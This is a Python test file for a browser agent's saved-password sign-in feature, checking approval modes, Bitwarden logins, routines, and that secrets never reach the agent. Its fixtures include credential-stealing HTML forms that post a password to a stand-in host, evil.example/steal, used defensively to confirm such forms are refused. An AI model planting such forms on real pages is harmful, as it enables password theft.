"""Your agent signing in with a saved password it never sees: Steed fills and
submits each step (username, password, one-time code) on the login's own
site, after your approval (Ask), at once (Always) or not at all (Never)."""

import json
import unittest
from unittest.mock import patch

import test_task_profiles as profiles
from test_passkeys import FakeKeys

from browser import access_levels
from services.task_policy import TaskPermissionError
from ui.signin_review import SigninReviewDialog

# Synthetic credentials only; the code secret is RFC 6238's published test key.
USERNAME = "synthetic-user@example.test"
PASSWORD = "Synthetic-Passw0rd-not-real"
TOTP = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"

PAGES = {
    "/login": b'<form method="post" action="/u"><input name="username" '
    b'autocomplete="username"><button>Next</button></form>',
    "/password": b'<form method="post" action="/p"><input type="password" '
    b'name="password" autocomplete="current-password"><button>Sign in</button></form>',
    "/code": b'<form method="post" action="/c"><input name="otp" '
    b'autocomplete="one-time-code"><button>Verify</button></form>',
    "/home": b"<p>Welcome back</p>",
    "/delete": b'<h1>Delete your account</h1><form method="post" action="/gone">'
    b'<input type="password" name="password" autocomplete="current-password">'
    b"<button>Continue</button></form>",
    "/change-email": b'<form method="post" action="/email"><input type="email" '
    b'name="email"><input type="password" name="password">'
    b'<input name="card" autocomplete="cc-number"><button>Save</button></form>',
    "/sneaky": b'<form method="post" action="/p"><input type="password" '
    b'name="password"><button formaction="https://evil.example/steal" '
    b'formtarget="f">Sign in</button></form><iframe name="f"></iframe>',
    "/elsewhere": b'<form method="post" action="https://evil.example/steal">'
    b'<input type="password" name="password"><button>Sign in</button></form>',
}
STEPS = {"/u": "/password", "/p": "/code", "/c": "/home"}


class VaultSigninTests(unittest.TestCase):
    setUpClass = classmethod(profiles.TaskProfileTests.setUpClass.__func__)
    tearDownClass = classmethod(profiles.TaskProfileTests.tearDownClass.__func__)
    wait_for = profiles.TaskProfileTests.wait_for
    request = profiles.TaskProfileTests.request
    navigate = profiles.TaskProfileTests.navigate

    def setUp(self):
        self.keys = patch("browser.password_service.KeyStore", FakeKeys)
        self.keys.start()
        profiles.TaskProfileTests.setUp(self)
        type(self).page_fixtures = dict(PAGES)
        type(self).post_responses = {
            path: (303, target, b"") for path, target in STEPS.items()
        }
        type(self).posted = []
        self.vault = self.registry.passwords.vault("work")
        self.vault.save(self.origin, USERNAME, PASSWORD, totp=TOTP)

    def tearDown(self):
        profiles.TaskProfileTests.tearDown(self)
        self.keys.stop()

    def command(self, command_name, *, client=None, **arguments):
        future = (client or self.service.broker).submit(command_name, **arguments)
        self.wait_for(future.done)
        return future.result()

    def session(self, path="/login"):
        task = self.command("task.create", objective="Stay signed in")
        grant = self.request(
            task.task_id,
            profile="existing:work",
            actions=["navigate", "read", "submit", "live"],
        )
        self.service.approve_grant(task.task_id, grant.grant_id)
        opened = self.command(
            "session.open", task_id=task.task_id, profile="existing:work", mode="live"
        )
        self.navigate(task.task_id, opened.session_id, path)
        return task.task_id, opened.session_id, self.service.client(task.task_id)

    def arrive(self, task, session, path):
        self.navigate(task, session, path)
        self.wait_for(
            lambda: (
                self.service.backend.inspect(session).url.endswith(path)
                and self.service.backend.inspect(session).load_success is True
            )
        )

    def finished(self, client, request_id):
        def done():
            receipt = self.command(
                "signin.status", client=client, request_id=request_id
            )
            return receipt["state"] not in ("awaiting_approval", "signing_in")

        self.wait_for(done)
        return self.command("signin.status", client=client, request_id=request_id)

    def test_ask_then_three_steps_without_the_agent_seeing_anything(self):
        task, session, client = self.session()
        receipt = self.command(
            "signin.request", client=client, session_id=session, request_id="s1"
        )
        self.assertEqual(receipt["state"], "awaiting_approval")
        (request,) = self.service.signin.pending(task)
        self.assertEqual(request.accounts[0][1], USERNAME)  # Shown to the person.
        dialog = SigninReviewDialog(self.service, request)
        try:
            dialog.apply()
        finally:
            dialog.deleteLater()
        final = self.finished(client, "s1")
        self.assertEqual(
            final,
            {
                "request_id": "s1",
                "state": "done",
                "site": "127.0.0.1",
                "outcome": "signed_in",
                "steps": 3,
            },
        )
        posted = {path: body for path, body, _ in self.posted}
        self.assertIn(b"synthetic-user", posted["/u"])
        self.assertIn(PASSWORD.encode(), posted["/p"])
        self.assertRegex(posted["/c"].decode(), r"otp=\d{6}")
        # Nothing the agent can read carries the login: not the receipts,
        # not the task's event record.
        events = json.dumps(
            [e.payload for e in self.service.store.events(task, limit=1000)]
        )
        for secret in (USERNAME, PASSWORD, posted["/c"].decode().split("=")[1]):
            self.assertNotIn(secret, json.dumps(final))
            self.assertNotIn(secret, events)
        self.assertEqual(
            self.service.backend.inspect(session).url, self.origin + "/home"
        )

    def test_one_approval_covers_the_site_briefly_and_always_needs_no_popup(self):
        task, session, client = self.session("/password")
        self.command(
            "signin.request", client=client, session_id=session, request_id="a"
        )
        (request,) = self.service.signin.pending(task)
        self.service.signin.resolve(
            task, "a", approve=True, login_id=request.accounts[0][0]
        )
        self.finished(client, "a")
        self.navigate(task, session, "/password")
        again = self.command(
            "signin.request", client=client, session_id=session, request_id="b"
        )
        self.assertEqual(again["state"], "signing_in")  # No second popup.
        self.assertEqual(self.finished(client, "b")["outcome"], "signed_in")
        access_levels.set_policy(self.config, "agents", "signin", "always")
        other, other_session, other_client = self.session("/password")
        quick = self.command(
            "signin.request",
            client=other_client,
            session_id=other_session,
            request_id="c",
        )
        self.assertEqual(quick["state"], "signing_in")

    def test_bitwarden_logins_sign_in_the_same_way(self):
        from browser.password_vault import Login

        class Unlocked:
            unlocked = True

            def logins(self, origin):
                return [
                    Login(
                        "bw:item-1",
                        origin,
                        USERNAME,
                        "Synthetic-Bw-Passw0rd",
                        totp=TOTP,
                    )
                ]

        self.vault.delete(self.vault.logins(self.origin)[0].id)
        self.registry.bitwarden = Unlocked()
        self.addCleanup(setattr, self.registry, "bitwarden", None)
        access_levels.set_policy(self.config, "agents", "signin", "always")
        task, session, client = self.session()
        self.command(
            "signin.request", client=client, session_id=session, request_id="b"
        )
        self.assertEqual(self.finished(client, "b")["outcome"], "signed_in")
        posted = {path: body for path, body, _ in self.posted}
        self.assertIn(b"Synthetic-Bw-Passw0rd", posted["/p"])

    def test_a_routine_you_allowed_signs_itself_in(self):
        routines = self.registry.routines
        outcomes = []
        routines.signed_in.connect(lambda r, site, outcome: outcomes.append(outcome))
        routine = routines.add(
            {
                "name": "Stay signed in",
                "ask": "Anything new?",
                # A page that asks for a password: it asks you to sign in.
                "pages": [self.origin + "/password"],
                "signin": True,
            },
            "work",
        )
        delivered = []
        routines.ran.connect(lambda r, text: delivered.append(text))
        routines.run(routine)
        self.wait_for(lambda: outcomes)
        self.assertEqual(outcomes, ["signed_in"])
        posted = {path: body for path, body, _ in self.posted}
        self.assertIn(PASSWORD.encode(), posted["/p"])
        self.assertRegex(posted["/c"].decode(), r"otp=\d{6}")
        self.wait_for(lambda: delivered)
        # Nothing of the login goes to the agent.
        self.assertNotIn(PASSWORD, delivered[0])

    def test_never_denied_no_login_and_forms_sending_elsewhere(self):
        task, session, client = self.session()
        self.command(
            "signin.request", client=client, session_id=session, request_id="d"
        )
        self.service.signin.resolve(task, "d", approve=False)
        self.assertEqual(self.finished(client, "d")["state"], "denied")
        self.assertEqual(self.posted, [])
        access_levels.set_policy(self.config, "agents", "signin", "always")
        self.navigate(task, session, "/elsewhere")
        result = self.finished(
            client,
            self.command(
                "signin.request", client=client, session_id=session, request_id="e"
            )["request_id"],
        )
        # A form that would send the password to another site is not filled.
        self.assertNotEqual(result["outcome"], "signed_in")
        self.assertEqual(self.posted, [])
        # Pages that ask for a password to do something else are not signed in.
        for path, request in (("/delete", "d1"), ("/change-email", "d2")):
            self.arrive(task, session, path)
            result = self.finished(
                client,
                self.command(
                    "signin.request",
                    client=client,
                    session_id=session,
                    request_id=request,
                )["request_id"],
            )
            self.assertEqual(result["outcome"], "not_a_sign_in_form", path)
        # A submit button that would send the form to another site.
        self.arrive(task, session, "/sneaky")
        result = self.finished(
            client,
            self.command(
                "signin.request", client=client, session_id=session, request_id="s1"
            )["request_id"],
        )
        self.assertNotEqual(result["outcome"], "signed_in")
        self.assertEqual(self.posted, [])
        self.vault.delete(self.vault.logins(self.origin)[0].id)
        self.navigate(task, session, "/login")
        self.assertEqual(
            self.command(
                "signin.request", client=client, session_id=session, request_id="f"
            )["outcome"],
            "no_saved_login",
        )
        access_levels.set_policy(self.config, "agents", "signin", "never")
        with self.assertRaises(TaskPermissionError):
            self.command(
                "signin.request", client=client, session_id=session, request_id="g"
            )

    def test_needs_a_live_session_and_the_tasks_own_submit_permission(self):
        for mode, actions, error in (
            ("restricted", ["navigate", "read", "submit"], ValueError),
            ("live", ["navigate", "read", "live"], TaskPermissionError),
        ):
            with self.subTest(mode=mode, actions=actions):
                task = self.command("task.create", objective="Sign in")
                grant = self.request(
                    task.task_id, profile="existing:work", actions=actions
                )
                self.service.approve_grant(task.task_id, grant.grant_id)
                opened = self.command(
                    "session.open",
                    task_id=task.task_id,
                    profile="existing:work",
                    mode=mode,
                )
                self.navigate(task.task_id, opened.session_id, "/password")
                with self.assertRaises(error):
                    self.command(
                        "signin.request",
                        client=self.service.client(task.task_id),
                        session_id=opened.session_id,
                        request_id="x",
                    )
                self.assertEqual(self.service.signin.pending(task.task_id), [])
        self.assertEqual(self.posted, [])


if __name__ == "__main__":
    unittest.main()
